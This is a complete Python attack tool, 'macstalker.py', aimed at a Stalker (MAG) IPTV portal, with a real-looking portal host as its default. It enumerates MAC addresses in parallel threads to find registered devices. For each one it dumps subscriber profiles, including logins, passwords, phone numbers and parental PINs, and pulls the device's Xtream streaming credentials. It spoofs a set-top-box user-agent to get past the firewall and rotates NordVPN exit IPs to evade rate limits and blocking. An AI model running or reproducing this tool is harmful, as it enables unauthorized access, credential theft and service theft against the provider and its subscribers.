#!/usr/bin/env python3
"""
macstalker.py -- Parallel MAC-scanning / MAC-spoofing tool for a Stalker (MAG) Portal.

Exploits the fact that the portal authorises service purely by a *client-supplied*
MAC address (trusted from the `mac` query param and/or `mac` cookie, with no
enforced signature). macstalker enumerates candidate MACs against an oracle
endpoint and, for any registered MAC it finds, optionally dumps that device's
service (profile, channels, favourites, recordings) and, via the handshake /
create_link flow, the underlying Xtream player credentials.

It rotates the source IP through the `nordvpn` CLI both proactively (after N
requests per IP) and reactively (when a block is detected), so a large scan can
run continuously without a hard WAF block.

This is a parallel, thread-based scanner: multiple worker threads pull MACs
from a shared queue and probe the portal concurrently, while a single serialized
rotation lock keeps the NordVPN state consistent.

Dependencies: python3 (>=3.8) + `requests` + `nordvpn` CLI.

Quick start:
    # scan the 00:1A:79 OUI over a range, 10 workers, auto-dump any registered MAC
    python3 macstalker.py --prefix 00:1A:79 --count 200 --dump

    # scan a list of MACs from a file, resume a previous run
    python3 macstalker.py --macs-file macs.txt --resume

    # scan explicit MACs, stop after finding 5
    python3 macstalker.py 00:1A:79:AA:00:01 00:1A:79:AA:00:02 --max-found 5
"""

import argparse
import json
import logging
import os
import re
import queue
import subprocess
import threading
import time
from urllib.parse import urljoin

import requests

log = logging.getLogger("macstalker")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# MAG STB user-agent that passes the WAF.
STB_UA = ("Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) "
          "MAG250 stbapp ver: 4 rev: 2721 Mobile Safari/533.3")

# Response the portal returns for an UNREGISTERED mac on the oracle endpoints.
EMPTY_MARKER = '{"js":[]}'

# Cookie sent alongside requests (matches the bash implementation).
def make_cookie(mac):
    return f"mac={mac}; stb_lang=en; timezone=Europe/Amsterdam;"

MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")

DEFAULT_BASE = "http://line.tvdsz.cc"
DEFAULT_COUNT = 100
DEFAULT_WORKERS = 10
DEFAULT_REQ_PER_IP = 12
DEFAULT_DELAY = 0.2
DEFAULT_TIMEOUT = 3.0

# Fallback country list if `nordvpn countries` is unavailable.
FALLBACK_COUNTRIES = [
    "Germany", "Netherlands", "France", "Canada", "Japan", "United_States",
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def norm_mac(mac):
    """Normalise a MAC string to 00:1A:79:XX:XX:XX form. Raises ValueError."""
    mac = mac.strip()
    if not MAC_RE.match(mac):
        raise ValueError(f"not a valid MAC: {mac!r}")
    return mac.upper()


def macs_from_file(path):
    out = []
    with open(path) as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            try:
                out.append(norm_mac(line))
            except ValueError:
                log.warning("skipping invalid MAC in %s: %r", path, line)
    return out


def gen_prefix_macs(prefix, count, start=0):
    """Generate `count` MACs by extending `prefix` with counted octets.

    The prefix may be 2-5 octets. The remaining octets (up to 6 total) are
    filled from `start` counting up, with the low bits on the right so the walk
    is natural: prefix '00:1A:79' yields 00:1A:79:00:00:00, ...:00:00:01, ...
    """
    parts = [p.upper() for p in prefix.split(":")]
    if len(parts) < 2 or len(parts) >= 6:
        raise ValueError(
            "prefix must contain 2-5 octets, e.g. 00:1A:79 (got %d)" % len(parts))
    need = 6 - len(parts)
    for i in range(count):
        n = start + i
        tail = [f"{((n >> ((need - 1 - j) * 8)) & 0xFF):02X}" for j in range(need)]
        yield ":".join(parts + tail)


def build_mac_source(args):
    """Collect candidate MACs in priority order: CLI, file, prefix.

    Returns a de-duplicated list (order preserved).
    """
    seen = set()
    out = []
    for m in args.macs:
        try:
            m = norm_mac(m)
        except ValueError:
            log.warning("skipping invalid MAC: %r", m)
            continue
        if m not in seen:
            seen.add(m)
            out.append(m)
    if args.macs_file:
        if not os.path.exists(args.macs_file):
            sys_exit(f"macs-file not found: {args.macs_file}")
        for m in macs_from_file(args.macs_file):
            if m not in seen:
                seen.add(m)
                out.append(m)
    if args.prefix:
        try:
            for m in gen_prefix_macs(args.prefix, args.count):
                if m not in seen:
                    seen.add(m)
                    out.append(m)
        except ValueError as e:
            sys_exit(str(e))
    return out


def sys_exit(msg):
    print(msg, file=_stderr())
    raise SystemExit(1)


def _stderr():
    import sys
    return sys.stderr


# ---------------------------------------------------------------------------
# NordVPN / network
# ---------------------------------------------------------------------------

def current_ip(timeout=5):
    try:
        r = requests.get("https://api.ipify.org", timeout=timeout)
        return r.text.strip() or None
    except Exception:  # noqa: BLE001
        return None


def run_nordvpn(args, timeout=60):
    """Run a nordvpn CLI command, returning (rc, stdout)."""
    try:
        p = subprocess.run(["nordvpn"] + args, capture_output=True,
                           text=True, timeout=timeout)
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except Exception as e:  # noqa: BLE001
        return -1, str(e)


def nordvpn_connected():
    rc, out = run_nordvpn(["status"])
    return "Connected" in out


def nordvpn_countries():
    """Fetch the list of available countries from the nordvpn CLI."""
    rc, out = run_nordvpn(["countries"], timeout=15)
    if rc != 0:
        return list(FALLBACK_COUNTRIES)
    lines = [ln.strip() for ln in out.splitlines() if ln.strip()]
    return lines if lines else list(FALLBACK_COUNTRIES)


def rotate_nordvpn(country):
    """Disconnect and reconnect to a fresh server in `country`.

    Returns the new source IP, or None if it could not be determined.
    """
    log.info("rotating NordVPN -> %s", country or "any")
    run_nordvpn(["disconnect"])
    time.sleep(2)
    if country:
        run_nordvpn(["connect", country])
    else:
        run_nordvpn(["connect"])
    # wait for a stable, reachable IP
    for _ in range(6):
        time.sleep(2)
        ip = current_ip()
        if ip:
            log.info("new source IP: %s", ip)
            return ip
    return current_ip()


class Rotator:
    """Thread-safe NordVPN rotation manager.

    Serializes all rotations behind a single lock (only one disconnect/connect
    at a time). Keeps a round-robin index over the available countries so
    successive rotations use different exit points, and tracks a per-IP request
    counter for proactive rotation.
    """

    def __init__(self, country=None, requests_per_ip=None):
        self.country = country
        self.requests_per_ip = requests_per_ip
        self.countries = []
        if country:
            self.countries = [country]
        else:
            self.countries = nordvpn_countries()
        if country and country not in self.countries:
            self.countries.insert(0, country)
        self._idx = 0
        self._lock = threading.Lock()
        self._used_this_ip = 0
        self.rotations = 0
        self.current = None
        self._dirty = False  # True -> a rotation is needed before the next request

    # -- connection --------------------------------------------------------
    def ensure_connected(self):
        ip = current_ip()
        if ip:
            self.current = ip
            log.info("using source IP %s", ip)
        elif nordvpn_connected():
            self.current = "<known>"
        else:
            self.current = self._rotate() or "<unknown>"

    def _next_country(self):
        c = self.countries[self._idx % len(self.countries)]
        self._idx += 1
        return c

    def rotate(self):
        """Force a rotation now (call under no lock; takes the lock itself)."""
        with self._lock:
            return self._rotate()

    def _rotate(self):
        # Caller must hold self._lock.
        self.rotations += 1
        country = self._next_country()
        new_ip = rotate_nordvpn(country)
        self.current = new_ip or "<unknown>"
        self._used_this_ip = 0
        self._dirty = False
        return self.current

    # -- request bookkeeping ----------------------------------------------
    def begin_request(self):
        """Called before a request; returns True if the caller must wait for a
        proactive rotation to finish first (rotation already performed)."""
        if self.requests_per_ip is not None:
            with self._lock:
                self._used_this_ip += 1
                if self._used_this_ip >= self.requests_per_ip:
                    self._dirty = True
                    log.info("reached %d requests on this IP -> proactive rotation",
                             self.requests_per_ip)
                    return True
        if self._dirty:
            # A previous block already queued a rotation; perform it now.
            with self._lock:
                if self._dirty:
                    self._rotate()
                    return True
        return False

    def report_ok(self):
        with self._lock:
            self._used_this_ip += 0  # no-op; counter handled in begin_request
            # ok response: nothing to do (clears nothing; counter resets on rotate)
            pass

    def report_blocked(self):
        """Mark that a block was observed; schedule a rotation."""
        with self._lock:
            if not self._dirty:
                log.warning("block detected -> rotating IP")
                self._rotate()
            else:
                self._dirty = False


# ---------------------------------------------------------------------------
# Portal probing
# ---------------------------------------------------------------------------

class Portal:
    """Thread-safe portal client. Each thread gets its own Session."""

    def __init__(self, base_url, timeout=DEFAULT_TIMEOUT, rotator=None):
        self.base = base_url.rstrip("/")
        self.portal = urljoin(self.base, "/c/portal.php")
        self.timeout = timeout
        self.rotator = rotator
        self._local = threading.local()

    def _session(self):
        s = getattr(self._local, "session", None)
        if s is None:
            s = requests.Session()
            s.headers.update({"User-Agent": STB_UA})
            self._local.session = s
        return s

    def _get(self, params, cookie_mac=None):
        headers = {}
        if cookie_mac:
            headers["Cookie"] = make_cookie(cookie_mac)
        try:
            return self._session().get(self.portal, params=params,
                                       headers=headers, timeout=self.timeout)
        except requests.RequestException as e:
            log.debug("request error: %s", e)
            return None

    def action(self, mac, action, cookie=True):
        """Perform a portal action. Returns (ok, text)."""
        params = {"JsHttpRequest": "1-xml", "type": "stb",
                  "action": action, "mac": mac}
        r = self._get(params, cookie_mac=mac if cookie else None)
        if r is None:
            return False, ""
        if r.status_code != 200:
            return False, f"HTTP {r.status_code}"
        return True, r.text

    @staticmethod
    def is_block(ok, text):
        """Heuristic: does this look like the WAF blocked us?"""
        if not ok:
            return True
        if text == EMPTY_MARKER:
            return False
        low = (text or "").lower()
        if "waf" in low or "<!doctype" in low or "access denied" in low \
                or "too many" in low:
            return True
        return False

    # --- oracle ----------------------------------------------------------
    def oracle(self, mac, oracle_kind="channels"):
        """Determine whether a MAC is registered.

        oracle_kind: 'channels' (1 req) | 'status' (1 req) | 'both' (2 req).
        Returns dict {verdict, len, texts}. verdict in REGISTERED|EMPTY|BLOCKED.
        """
        texts = {}
        if oracle_kind in ("channels", "both"):
            ok, text = self.action(mac, "get_all_channels")
            texts["channels"] = text
            if self.is_block(ok, text):
                return {"verdict": "BLOCKED", "len": len(text), "texts": texts}
        if oracle_kind in ("status", "both"):
            ok, text = self.action(mac, "check_portal_status")
            texts["status"] = text
            if self.is_block(ok, text):
                return {"verdict": "BLOCKED", "len": len(text), "texts": texts}

        def non_empty(t):
            t = (t or "").strip()
            if not t or t == EMPTY_MARKER:
                return False
            try:
                return bool(json.loads(t).get("js", t))
            except Exception:
                return len(t) > 20

        registered = any(non_empty(v) for v in texts.values())
        return {"verdict": "REGISTERED" if registered else "EMPTY",
                "len": max((len(v) for v in texts.values()), default=0),
                "texts": texts}

    # --- dump ----------------------------------------------------------
    def dump(self, mac):
        """Pull the full service picture for a (presumably) registered MAC."""
        def grab(action):
            _, text = self.action(mac, action, cookie=True)
            return text

        def js(text):
            try:
                return json.loads(text).get("js", text)
            except Exception:
                return text

        profile_text = grab("get_profile")
        out = {
            "mac": mac,
            "profile": js(profile_text),
            "channels": js(grab("get_all_channels")),
            "fav_channels": js(grab("get_all_fav_channels")),
            "recordings": js(grab("get_active_recordings")),
            "modules": js(grab("get_modules")),
        }
        try:
            p = json.loads(profile_text).get("js", {})
            if isinstance(p, dict):
                out["interesting"] = {k: p.get(k) for k in (
                    "id", "name", "sname", "login", "pass", "mac", "phone",
                    "account_balance", "tariff_plan_id", "status",
                    "parent_password", "settings_password", "last_active",
                    "created") if k in p}
            else:
                out["interesting"] = {}
        except Exception:
            out["interesting"] = {}
        # Bonus: try to extract Xtream player credentials.
        player = self.extract_player_info(mac)
        if player:
            out["player"] = player
        return out

    def extract_player_info(self, mac):
        """handshake -> token -> create_link -> ffplay -> player_api.php.

        Returns a small dict with the Xtream user_info fields, or None.
        """
        _, token_text = self.action(mac, "handshake")
        m = re.search(r'"token":"([^"]*)"', token_text or "")
        if not m:
            return None
        token = m.group(1)

        link_params = {"JsHttpRequest": "1-xml", "type": "itv",
                       "action": "create_link", "cmd": "", "series": "",
                       "forced_storage": "undefined", "disable_ad": "0",
                       "download": "0", "mac": mac}
        headers = {"Authorization": f"Bearer {token}"}
        try:
            r = self._session().get(self.portal, params=link_params,
                                    headers=headers, timeout=self.timeout)
        except requests.RequestException:
            return None
        text = r.text if r else ""
        m2 = re.search(r'"cmd":"([^"]*)"', text) or \
             re.search(r'"cmd":"(ffmpeg[^"]*)"', text)
        if not m2:
            # fall back to parsing .js.cmd or .js[0].cmd
            try:
                data = json.loads(text)
                js = data.get("js")
                if isinstance(js, dict) and js.get("cmd"):
                    cmd = js["cmd"]
                elif isinstance(js, list) and js and isinstance(js[0], dict):
                    cmd = js[0].get("cmd")
                else:
                    cmd = None
            except Exception:
                cmd = None
        else:
            cmd = m2.group(1)
        if not cmd:
            return None
        cmd = cmd.replace("ffmpeg ", "", 1)
        # http://host/user/pass/...
        parts = cmd.split("/")
        # scheme://host/user/pass/...  -> parts[1]=host, [2]=user, [3]=pass
        user = parts[2] if len(parts) > 3 else ""
        pw = parts[3] if len(parts) > 3 else ""
        if not user or not pw:
            return None
        try:
            r = requests.get(f"{self.base}/player_api.php",
                             params={"username": user, "password": pw},
                             timeout=self.timeout,
                             headers={"User-Agent": STB_UA})
            info = r.json()
        except Exception:
            return None
        ui = info.get("user_info", {}) if isinstance(info, dict) else {}
        return {
            "username": user,
            "exp_date": ui.get("exp_date"),
            "max_connections": ui.get("max_connections"),
            "active_cons": ui.get("active_cons"),
        }


# ---------------------------------------------------------------------------
# State (incremental save / resume)
# ---------------------------------------------------------------------------

class State:
    def __init__(self, path):
        self.path = path
        self.tried = set()
        self.registered = {}
        self._lock = threading.Lock()
        if path and os.path.exists(path):
            try:
                with open(path) as fh:
                    data = json.load(fh)
                self.tried = set(data.get("tried", []))
                self.registered = data.get("registered", {})
            except Exception:
                pass

    def is_tried(self, mac):
        with self._lock:
            return mac in self.tried

    def mark_tried(self, mac):
        with self._lock:
            self.tried.add(mac)

    def save(self):
        with self._lock:
            if not self.path:
                return
            tmp = self.path + ".tmp"
            payload = {"tried": sorted(self.tried),
                       "registered": self.registered}
            with open(tmp, "w") as fh:
                json.dump(payload, fh, indent=2)
            os.replace(tmp, self.path)

    def save_registered(self, mac, dump):
        with self._lock:
            self.registered[mac] = dump
            if self.path:
                tmp = self.path + ".tmp"
                payload = {"tried": sorted(self.tried),
                           "registered": self.registered}
                with open(tmp, "w") as fh:
                    json.dump(payload, fh, indent=2)
                os.replace(tmp, self.path)


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

class Scanner:
    def __init__(self, args, portal, rotator, state, macs):
        self.args = args
        self.portal = portal
        self.rotator = rotator
        self.state = state
        self.macs = macs
        self.found = 0
        self.empty = 0
        self._found_lock = threading.Lock()
        self._stop = threading.Event()
        # Bounded retry: mac -> how many times we've already blocked on it.
        self._retry = {}
        self._retry_lock = threading.Lock()

    def max_found(self):
        a = self.args
        if a.macs:
            return len(a.macs)
        if a.macs_file:
            # count non-blank, non-comment lines
            n = 0
            try:
                with open(a.macs_file) as fh:
                    for line in fh:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            n += 1
            except Exception:
                n = a.count
            return n
        return a.count

    def should_stop(self):
        return self._stop.is_set() or self._reached_max_found()

    def _reached_max_found(self):
        return self.found >= self.args.max_found

    def handle_mac(self, mac):
        """Probe one MAC; returns 'REGISTERED', 'EMPTY', or 'BLOCKED'."""
        res = self.portal.oracle(mac, oracle_kind=self.args.oracle)
        verdict = res["verdict"]

        if verdict == "BLOCKED":
            # Rotate and retry the same MAC, bounded.
            self.rotator.report_blocked()
            for attempt in range(self.args.max_retry):
                time.sleep(0.2 * (attempt + 1))
                res = self.portal.oracle(mac, oracle_kind=self.args.oracle)
                verdict = res["verdict"]
                if verdict != "BLOCKED":
                    break
            # If still blocked after retries, treat as blocked (not tried)
            # and let the caller decide to re-queue a bounded number of times.
            if verdict == "BLOCKED":
                return "BLOCKED"
            self.rotator.report_ok()
        else:
            self.rotator.report_ok()

        if self.args.delay > 0:
            time.sleep(self.args.delay)

        if verdict == "REGISTERED":
            self._on_registered(mac, res)
            return "REGISTERED"
        return "EMPTY"

    def _on_registered(self, mac, res):
        with self._found_lock:
            self.found += 1
            log.info("REGISTERED MAC: %s (len=%d)", mac, res["len"])
        for k, v in res.get("texts", {}).items():
            log.debug("  %s=%s", k, v[:300])
        if self.args.dump:
            dump = self.portal.dump(mac)
            self.state.save_registered(mac, dump)
            player = dump.get("player")
            if player:
                log.info("  player: exp=%s max=%s active=%s",
                         player.get("exp_date"),
                         player.get("max_connections"),
                         player.get("active_cons"))
            log.info("  dumped -> %s", self.args.out)
        self._maybe_stop()

    def _maybe_stop(self):
        if self._reached_max_found():
            self._stop.set()

    def worker(self, q):
        while True:
            if self.should_stop():
                return
            try:
                mac = q.get_nowait()
            except queue.Empty:
                return

            # Proactive per-IP rotation before the request.
            self.rotator.begin_request()

            if self.args.resume and self.state.is_tried(mac):
                q.task_done()
                continue

            result = self.handle_mac(mac)

            if result == "BLOCKED":
                # Re-queue a bounded number of times to avoid an infinite loop
                # of blocked MACs.
                with self._retry_lock:
                    tries = self._retry.get(mac, 0)
                    if tries >= self.args.max_blocked_park:
                        # Give up on this MAC for this run; mark tried so the
                        # resume logic skips it next time.
                        self.state.mark_tried(mac)
                        self._retry.pop(mac, None)
                        q.task_done()
                        continue
                    self._retry[mac] = tries + 1
                # Rotate already done in report_blocked; re-queue.
                q.put(mac)
                q.task_done()
                continue

            # EMPTY or REGISTERED: mark tried.
            self.state.mark_tried(mac)

            if result == "EMPTY":
                with self._found_lock:
                    self.empty += 1

            q.task_done()

    def run(self, workers):
        q = queue.Queue()
        for m in self.macs:
            q.put(m)

        threads = []
        for i in range(workers):
            t = threading.Thread(target=self.worker, args=(q,),
                                  name=f"worker-{i}", daemon=True)
            t.start()
            threads.append(t)

        # Wait for all work to drain or stop.
        for t in threads:
            while t.is_alive():
                t.join(timeout=0.5)

        self.state.save()
        return self.found, self.empty


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args(argv):
    import sys
    ap = argparse.ArgumentParser(
        description="macstalker - parallel scan of a Stalker Portal for registered MACs")
    ap.add_argument("macs", nargs="*",
                    help="explicit MACs on the command line")
    ap.add_argument("--base", default=DEFAULT_BASE,
                    help="portal base URL (default %(default)s)")
    ap.add_argument("--macs-file", help="file with one MAC per line")
    ap.add_argument("--prefix", help="MAC prefix to enumerate, e.g. 00:1A:79")
    ap.add_argument("--count", type=int, default=DEFAULT_COUNT,
                    help="number of MACs to generate from --prefix")
    ap.add_argument("--oracle", choices=["both", "channels", "status"],
                    default="channels",
                    help="oracle endpoint(s) to use (default: channels = 1 req/MAC)")
    ap.add_argument("--workers", type=int, default=DEFAULT_WORKERS,
                    help="parallel worker threads (default %(default)s)")
    ap.add_argument("--dump", action="store_true",
                    help="dump full service for any registered MAC")
    ap.add_argument("--country", default=None,
                    help="NordVPN country for rotation (default: round-robin)")
    ap.add_argument("--requests-per-ip", type=int, default=DEFAULT_REQ_PER_IP,
                    help="rotate to a fresh IP after N requests per IP "
                         "(default %(default)s; the WAF hard-blocks ~15-20)")
    ap.add_argument("--delay", type=float, default=DEFAULT_DELAY,
                    help="sleep between MACs (default %(default)s s)")
    ap.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT,
                    help="per-request timeout seconds (default %(default)s)")
    ap.add_argument("--max-found", type=int, default=None,
                    help="stop after finding N registered MACs "
                         "(default: derived from source size)")
    ap.add_argument("--max-retry", type=int, default=3,
                    help="times to retry a single blocked MAC before giving up")
    ap.add_argument("--max-blocked-park", type=int, default=5,
                    help="max times a persistently blocked MAC is re-queued")
    ap.add_argument("--state", default="scan.state",
                    help="state file for incremental save/resume")
    ap.add_argument("--resume", action="store_true",
                    help="skip MACs already tried in the state file")
    ap.add_argument("--out", default="registered.json",
                    help="output file for registered MACs (dump)")
    ap.add_argument("--no-vpn", action="store_true",
                    help="do not attempt NordVPN rotation (use current IP)")
    ap.add_argument("--verbose", "-v", action="store_true")
    args = ap.parse_args(argv)
    if args.max_found is None:
        # derive below in main once source is known
        pass
    return args


def main(argv=None):
    import sys
    args = parse_args(argv if argv is not None else sys.argv[1:])
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s", datefmt="%H:%M:%S")

    macs = build_mac_source(args)
    if not macs:
        sys_exit("No MACs to scan. Provide --prefix, --macs-file, or positional MACs.")

    # Derive max_found from source size if not explicitly given.
    if args.max_found is None:
        if args.macs:
            args.max_found = len(args.macs)
        elif args.macs_file:
            args.max_found = len([m for m in macs if m])
        else:
            args.max_found = args.count

    rotator = Rotator(country=args.country, requests_per_ip=args.requests_per_ip)
    portal = Portal(args.base, timeout=args.timeout, rotator=rotator)
    state = State(args.state)

    log.info("=== macstalker ===")
    log.info("  Portal:    %s", args.base)
    log.info("  Total MACs: %d", len(macs))
    log.info("  Workers:   %d", args.workers)
    log.info("  Req/IP:    %s", args.requests_per_ip)
    log.info("  Oracle:    %s", args.oracle)
    log.info("  State:     %s (resume: %s)", args.state, args.resume)
    log.info("  Output:    %s", args.out)
    if not args.no_vpn:
        rotator.ensure_connected()
        log.info("  Source IP: %s", rotator.current)

    scanner = Scanner(args, portal, rotator, state, macs)
    try:
        found, empty = scanner.run(workers=args.workers)
    except KeyboardInterrupt:
        log.warning("interrupted; saving state…")
        state.save()
        raise
    finally:
        state.save()

    # Persist the registered set to the output file regardless of --dump.
    with open(args.out, "w") as fh:
        json.dump(state.registered, fh, indent=2)

    log.info("done: %d registered, %d empty, rotations=%d, state=%s",
             found, empty, rotator.rotations, args.state)
    log.info("registered MACs -> %s", args.out)
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(main())
